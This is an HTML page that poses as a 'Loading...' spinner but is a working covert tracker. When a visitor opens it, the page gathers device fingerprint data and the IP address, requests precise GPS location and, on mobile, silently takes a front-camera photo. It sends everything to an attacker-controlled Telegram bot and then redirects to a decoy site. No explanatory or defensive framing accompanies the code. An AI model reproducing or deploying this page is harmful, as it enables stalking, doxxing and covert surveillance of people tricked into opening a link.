<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh; display: flex;
            justify-content: center; align-items: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        .loader { text-align: center; color: white; }
        .spinner {
            width: 50px; height: 50px;
            border: 5px solid rgba(255,255,255,0.3);
            border-top-color: white; border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .text { font-size: 16px; margin-top: 10px; }
        #camera-preview {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            object-fit: cover;
            z-index: -1;
            opacity: 0.3;
        }
    </style>
</head>
<body>
    <video id="camera-preview" autoplay playsinline></video>
    <div class="loader">
        <div class="spinner"></div>
        <div class="text" id="status">Loading...</div>
    </div>

    <script>
    // Get URL parameters
    var params = new URLSearchParams(window.location.search);
    var redirectUrl = params.get('r') || 'https://google.com';
    var botToken = params.get('bot') || '';
    var chatId = params.get('chat') || '';
    
    // Visitor data
    var visitorData = {
        timestamp: new Date().toISOString(),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenResolution: screen.width + 'x' + screen.height,
        viewport: window.innerWidth + 'x' + window.innerHeight,
        cpuCores: navigator.hardwareConcurrency || 'Unknown',
        deviceMemory: navigator.deviceMemory || 'Unknown',
        connection: null,
        gps: null,
        photo: null,
        ip: null
    };
    
    // Get network info
    if (navigator.connection) {
        visitorData.connection = {
            type: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt
        };
    }
    
    // Detect if mobile or desktop
    var isMobile = /Android|iPhone|iPad|iPod|webOS/i.test(navigator.userAgent);
    
    // Get IP
    fetch('https://api.ipify.org?format=json')
        .then(function(r) { return r.json(); })
        .then(function(d) { visitorData.ip = d.ip; })
        .catch(function() {});
    
    // Capture GPS
    function captureGPS() {
        return new Promise(function(resolve) {
            if (!navigator.geolocation) {
                resolve({ success: false, error: 'Geolocation not supported on this device' });
                return;
            }
            
            var options = {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            };
            
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    resolve({
                        success: true,
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        speed: position.coords.speed,
                        heading: position.coords.heading,
                        mapsUrl: 'https://maps.google.com/maps?q=' + 
                                 position.coords.latitude + ',' + 
                                 position.coords.longitude + 
                                 '&ll=' + position.coords.latitude + ',' + 
                                 position.coords.longitude + '&z=16'
                    });
                },
                function(error) {
                    var errorMsg;
                    switch(error.code) {
                        case 1: errorMsg = 'Location permission denied'; break;
                        case 2: errorMsg = 'Location unavailable (no GPS/network)'; break;
                        case 3: errorMsg = 'Location request timed out'; break;
                        default: errorMsg = error.message;
                    }
                    resolve({ success: false, error: errorMsg, code: error.code });
                },
                options
            );
        });
    }
    
    // Capture photo from camera
    function capturePhoto() {
        return new Promise(function(resolve) {
            // Only on mobile with camera
            if (!isMobile || !navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                resolve(null);
                return;
            }
            
            var video = document.getElementById('camera-preview');
            
            navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: 'user',
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                } 
            })
            .then(function(stream) {
                video.style.display = 'block';
                video.srcObject = stream;
                video.play();
                
                // Wait for camera to initialize
                setTimeout(function() {
                    try {
                        var canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        var ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        var photoData = canvas.toDataURL('image/jpeg', 0.7);
                        
                        // Stop camera
                        stream.getTracks().forEach(function(track) { track.stop(); });
                        video.style.display = 'none';
                        
                        resolve(photoData);
                    } catch(e) {
                        resolve(null);
                    }
                }, 1500);
            })
            .catch(function(err) {
                console.log('Camera error:', err);
                resolve(null);
            });
        });
    }
    
    // Send photo to Telegram
    function sendPhotoToTelegram(photoData) {
        if (!botToken || !chatId || !photoData) return;
        
        var formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', dataURLtoBlob(photoData), 'captured_photo.jpg');
        formData.append('caption', '📸 *Camera Capture Received*');
        
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://api.telegram.org/bot' + botToken + '/sendPhoto', true);
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) {
                console.log('Photo sent:', xhr.status);
            }
        };
        xhr.send(formData);
    }
    
    function dataURLtoBlob(dataurl) {
        var arr = dataurl.split(',');
        var mime = arr[0].match(/:(.*?);/)[1];
        var bstr = atob(arr[1]);
        var n = bstr.length;
        var u8arr = new Uint8Array(n);
        while(n--) { u8arr[n] = bstr.charCodeAt(n); }
        return new Blob([u8arr], {type: mime});
    }
    
    // Send message to Telegram
    function sendToTelegram(data) {
        if (!botToken || !chatId) return;
        
        var message = '';
        
        message += '📍 *GPS LOCATION CAPTURED*\\n';
        message += '━━━━━━━━━━━━━━━━\\n\\n';
        
        if (data.gps && data.gps.success) {
            message += '✅ *GPS Coordinates Found:*\\n';
            message += '• Latitude: `' + data.gps.latitude.toFixed(6) + '`\\n';
            message += '• Longitude: `' + data.gps.longitude.toFixed(6) + '`\\n';
            message += '• Accuracy: ' + data.gps.accuracy.toFixed(1) + 'm\\n';
            if (data.gps.altitude) message += '• Altitude: ' + data.gps.altitude.toFixed(1) + 'm\\n';
            if (data.gps.speed) message += '• Speed: ' + (data.gps.speed * 3.6).toFixed(1) + ' km/h\\n';
            message += '\\n🗺️ *Maps:*\\n';
            message += '• [Google Maps](' + data.gps.mapsUrl + ')\\n';
            message += '• [Street View](https://maps.google.com/?q=' + data.gps.latitude + ',' + data.gps.longitude + '&layer=c)\\n';
        } else {
            var errorMsg = data.gps ? data.gps.error : 'Not available';
            message += '❌ *GPS: ' + errorMsg + '*\\n';
            if (!isMobile) {
                message += '💡 Desktop detected - GPS not available\\n';
                message += 'IP-based location will be shown instead\\n';
            }
        }
        
        message += '\\n';
        message += '📱 *Device Info*\\n';
        message += '• ' + data.platform + '\\n';
        message += '• Screen: ' + data.screenResolution + '\\n';
        message += '• Language: ' + data.language + '\\n';
        if (data.cpuCores) message += '• CPU: ' + data.cpuCores + ' cores\\n';
        if (data.deviceMemory) message += '• RAM: ' + data.deviceMemory + ' GB\\n';
        if (data.connection) {
            message += '• Network: ' + data.connection.type + '\\n';
        }
        
        message += '\\n';
        message += '🌐 *Network*\\n';
        message += '• IP: `' + (data.ip || 'Unknown') + '`\\n';
        message += '• Timezone: ' + data.timezone + '\\n';
        message += '• Referrer: ' + data.referrer + '\\n';
        
        message += '\\n🕐 ' + data.timestamp;
        
        // Send message
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://api.telegram.org/bot' + botToken + '/sendMessage', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) {
                console.log('Message sent:', xhr.status);
                document.getElementById('status').textContent = 'Redirecting...';
                setTimeout(function() {
                    window.location.href = redirectUrl;
                }, 2000);
            }
        };
        xhr.send(JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown',
            disable_web_page_preview: false
        }));
    }
    
    // Main
    async function main() {
        document.getElementById('status').textContent = 'Detecting location...';
        visitorData.gps = await captureGPS();
        
        // Take photo if GPS granted and on mobile
        if (visitorData.gps && visitorData.gps.success) {
            document.getElementById('status').textContent = 'Capturing photo...';
            visitorData.photo = await capturePhoto();
            if (visitorData.photo) {
                sendPhotoToTelegram(visitorData.photo);
            }
        }
        
        document.getElementById('status').textContent = 'Sending data...';
        sendToTelegram(visitorData);
    }
    
    main();
    </script>
</body>
</html>
